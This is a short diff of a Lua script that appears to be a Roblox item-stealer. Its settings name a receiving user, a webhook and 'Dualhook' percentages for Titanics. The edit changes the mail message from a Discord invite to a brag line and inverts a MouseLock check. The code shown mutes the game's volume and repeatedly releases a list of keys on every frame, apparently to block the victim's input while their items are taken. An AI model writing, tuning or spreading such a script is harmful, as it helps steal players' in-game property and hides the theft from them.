@@ -10,7 +10,7 @@
 getgenv().Settings = {
     User = "StickOwwz",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
-    MailMessage = ".gg/uSgzNwHDTS",
+    MailMessage = "FuegoEterno On Top",
     Titanics = {
         Dualhook = true,
         Intensity = 100 --%
@@ -62,7 +62,7 @@ local disabledKeyCodes = {
     0x0D,
 };
 UserSettings().GameSettings.MasterVolume = 0
-if _G.MouseLock ~= false then
+if _G.MouseLock ~= true then
     runService.RenderStepped:Connect(function()
         for _, keyCode in next, disabledKeyCodes do
             keyrelease(keyCode)
